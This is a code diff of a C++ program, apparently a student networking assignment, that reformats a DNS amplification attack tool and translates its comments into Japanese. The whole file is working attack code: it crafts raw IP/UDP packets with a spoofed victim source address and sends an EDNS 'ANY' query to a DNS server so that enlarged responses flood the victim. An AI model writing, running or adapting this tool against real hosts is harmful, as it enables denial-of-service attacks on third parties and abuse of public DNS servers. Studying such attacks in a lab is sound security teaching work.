@@ -1,32 +1,31 @@
 #include <iostream>
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h> // sleep
-#include <string.h> // bzero
+#include <cstdio>
+#include <cstdlib>
+#include <cstring> // bzero
 #include <sys/socket.h> // socket
 #include <netinet/ip.h> // ip header
 #include <netinet/udp.h> // udp header
 #include <arpa/inet.h> // inet_addr, htons
 
-#define MAX_BUFF 65535 // ipv4 packet max length
-#define DNS_PORT 53 // dns port
-#define DNS_REPEAT 3 // dns queries repeat time
-#define MAIN_USAGE "./dns_attack <Victim IP> <UDP Source Port> <DNS Server IP>"
-#define DOMAIN_NAME "4ieee3org" // dns special format
+#include <chrono>
+#include <thread>
 
-using namespace std;
+#define MAX_BUFF 65535 // ipv4パケット最大長
+#define DNS_PORT 53 // dns port
+#define DNS_REPEAT 3 // DNSクエリのリピート時間
+#define DOMAIN_NAME "4ieee3org" // DNS特殊形式
 
 struct dnshdr {
     uint16_t queryid;
-    uint16_t flags; // bit-mask to indicate request/response
-    uint16_t qu_count; // questions count
-    uint16_t an_count; // answers count
-    uint16_t au_count; // authority count
-    uint16_t ad_count; // additional records count
+    uint16_t flags; // 要求/応答を示すビットマスク
+    uint16_t qu_count; // 問題数
+    uint16_t an_count; // 回答数
+    uint16_t au_count; // 権限数
+    uint16_t ad_count; // 追加レコード数
 } __attribute__((packed));
 
 struct dnsdata {
-    unsigned char dname[10]; // domain name with special format
+    unsigned char dname[10]; // 特殊系ドメイン名
     uint16_t dnstype;
     uint16_t dnsclass;
 } __attribute__((packed));
@@ -61,36 +60,47 @@ void err_exit(const char *x) {
 
 unsigned short checksum(void *in, int size){
     long sum = 0;
-    unsigned short *ptr = (unsigned short *) in;
+    unsigned short *ptr = (unsigned short *)in;
+
     // sum up
-    for (; size > 1; size -= 2) sum += *ptr++;
-    // zero-padding if length is odd
-    if (size > 0) sum += *((unsigned char *) ptr);
+    for (; size > 1; size -= 2) {
+        sum += *ptr++;
+    }
+
+    // 奇数の場合はゼロパディング
+    if (size > 0) {
+        sum += *((unsigned char *) ptr);
+    }
+
     // overflow
-    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
-    // return 1's complement
+    while (sum >> 16) {
+        sum = (sum & 0xffff) + (sum >> 16);
+    }
+
+    // 1の補数を返す
     return ~sum;
 }
 
 void set_dns(unsigned char *packet, size_t &packetlen) {
-    // pointer to start of dns header
+    // DNSヘッダの開始位置へのポインタ
     struct dnshdr *dnsh = (struct dnshdr *) (packet + sizeof(struct iphdr) + sizeof(struct udphdr));
-    // fill in dns header
-    dnsh -> queryid = htons(0x73B6); // last 16 bits (2 bytes) of student ID 0816054
-    dnsh -> flags = htons(0x0100); // shown on the top of dns flag structure
+    // DNSヘッダを埋める
+    dnsh -> queryid = htons(0x73B6); // 学生IDの最後の16ビット（2バイト） 0816054
+    dnsh -> flags = htons(0x0100); // dns フラグ構造体の上部に表示される
     dnsh -> qu_count = htons(1); // one question ANY
     dnsh -> ad_count = htons(1); // one OPT for EDNS
     packetlen += sizeof(struct dnshdr);
-    // pointer to start of dns data
+    // DNSデータの先頭を指すポインタ
     struct dnsdata *dnsd = (struct dnsdata *) (packet + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
-    // fill in dns data
-    dnsd -> dnstype = htons(255); // 255 for any (*)
-    dnsd -> dnsclass = htons(1); // 1 for internet
-    // transform the domain name into special format, digit to hex
+    // DNSデータを埋める
+    dnsd -> dnstype = htons(255); // 任意の(*)で255
+    dnsd -> dnsclass = htons(1); // インターネット用1
+    // ドメイン名を特殊な形式、つまり数字から16進数に変換する
     unsigned char transformed[] = DOMAIN_NAME;
     for (int i = 0; i < strlen(DOMAIN_NAME); i++) {
-        if (isdigit(transformed[i]))
+        if (isdigit(transformed[i])) {
             transformed[i] = transformed[i] - 48;
+        }
     }
     memcpy(dnsd -> dname, transformed, strlen(DOMAIN_NAME));
     packetlen += sizeof(struct dnsdata);
@@ -98,7 +108,7 @@ void set_dns(unsigned char *packet, size_t &packetlen) {
     struct dnsopt *dnso = (struct dnsopt *) (packet + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + sizeof(struct dnsdata));
     dnso -> name = 0;
     dnso -> type = htons(41);
-    dnso -> udplength = htons(4096); // increase to 4096 bytes
+    dnso -> udplength = htons(4096); // 4096バイトに増加
     dnso -> rcode = 0;
     dnso -> ednsversion = 0;
     dnso -> Z = htons(0x8000);
@@ -107,78 +117,88 @@ void set_dns(unsigned char *packet, size_t &packetlen) {
 }
 
 void set_udphdr(unsigned char *packet, size_t &packetlen, int srcport) {
-    // pointer to start of udp header
+    // udpヘッダの開始位置へのポインタ
     struct udphdr *udp = (struct udphdr *) (packet + sizeof(struct iphdr));
-    // update packet length
+    // 更新パケット長
     packetlen += sizeof(struct udphdr);
-    // fill in udp header
+    // udpヘッダを埋める
     udp -> source = htons(srcport);
     udp -> dest = htons(DNS_PORT);
-    udp -> len = htons(packetlen); // udp packet total length (include header)
+    udp -> len = htons(packetlen); // udpパケット全長（ヘッダを含む）
     udp -> check = checksum(packet, packetlen);
 }
 
 void set_iphdr(unsigned char *packet, size_t &packetlen, char *saddr, char *daddr) {
-    // pointer to start of ip header
+    // ipヘッダの開始位置へのポインタ
     struct iphdr *ip = (struct iphdr *) packet;
-    // update packet length
+    // 更新パケット長
     packetlen += sizeof(struct iphdr);
-    // fill in ip header
-    ip -> ihl = 5; // header length (32 bit increments)
+    // ipヘッダを埋める
+    ip -> ihl = 5; // ヘッダ長（32ビット単位）
     ip -> version = 4; // ipv4
     ip -> tos = 0; // normal (type of service)
-    ip -> tot_len = htons(packetlen); // ip packet total length (include header)
+    ip -> tot_len = htons(packetlen); // ipパケット全長（ヘッダーを含む）
     ip -> ttl = 64; // time to live
     ip -> protocol = IPPROTO_UDP; // udp
     ip -> check = checksum(packet, packetlen);
-    ip -> saddr = inet_addr(saddr); // ip spoofing
+    ip -> saddr = inet_addr(saddr); // ipを偽装
     ip -> daddr = inet_addr(daddr);
 }
 
-int main(int argc, char **argv) {
-    // declaration
+int main(int argc, char *argv[]) {
+    // 宣言
     int srcport;
-    int sockfd; // socket file descriptor
-    int on; // socket option
-    struct sockaddr_in dstaddr; // socket destination address
+    int sockfd; // ソケットファイル記述子
+    int on; // ソケットオプション
+    struct sockaddr_in dstaddr; // ソケット宛先アドレス
     socklen_t dstlen;
-    unsigned char packet[MAX_BUFF]; // packet buffer
+    unsigned char packet[MAX_BUFF]; // パケットバッファ
     size_t packetlen;
 
-    // return usage
-    if (argc != 4) err_exit(MAIN_USAGE);
-    // check port value
+    // 使い方
+    if (argc != 4) {
+        printf("How to use: %s <Victim IP> <UDP Source Port> <DNS Server IP>", argv[0]);
+        exit(1);
+    }
+
+    // 範囲内のポート番号か調べる
     srcport = atoi(argv[2]);
-    if (srcport > 65535 || srcport < 0) err_exit("main: wrong port value");
+    if (srcport < 0 || srcport > 65535) {
+        err_exit("main: wrong port value");
+    }
 
-    // create a raw socket
-    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0)
+    // 生ソケットを作成する
+    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
         err_exit("main: socket");
-    // set socket option to build the ip header by self
-    on = 1;
-    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(int)) < 0)
-        err_exit("main: setsockopt");
+    }
 
-    // fill in destination address
+    // ipヘッダを自己生成するソケットオプションを設定する。
+    on = 1;
+    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(int)) < 0) {
+        err_exit("main: setsockopt");
+    }
+
+    // 宛先アドレスの記入
     bzero(&dstaddr, sizeof(dstaddr));
     dstaddr.sin_family = AF_INET;
-    dstaddr.sin_addr.s_addr = inet_addr(argv[3]); // dns server
-    dstaddr.sin_port = htons(DNS_PORT); //dns port
+    dstaddr.sin_addr.s_addr = inet_addr(argv[3]); // dnsサーバ
+    dstaddr.sin_port = htons(DNS_PORT); //dnsポート番号
     dstlen = sizeof(dstaddr);
 
-    // encapsulate the packet (from inside)
+    // パケットを(内部から)カプセル化する
     packetlen = 0;
     memset(packet, 0, MAX_BUFF);
     set_dns(packet, packetlen);
     set_udphdr(packet, packetlen, srcport);
     set_iphdr(packet, packetlen, argv[1], argv[3]);
 
-    // send to destination
+    // 送りつける
     for (int i = 0; i < DNS_REPEAT; i++) {
-        if (sendto(sockfd, packet, packetlen, 0, (struct sockaddr *) &dstaddr, dstlen) < 0)
+        if (sendto(sockfd, packet, packetlen, 0, (struct sockaddr *) &dstaddr, dstlen) < 0) {
 			err_exit("main: sendto");
+        }
         printf("Sending DNS packet to DNS server %s with spoofed source %s:%d\n", argv[3], argv[1], srcport);
-        sleep(1);
+        std::this_thread::sleep_for(std::chrono::milliseconds(1000));//sleep(1);
     }
 
     return 0;
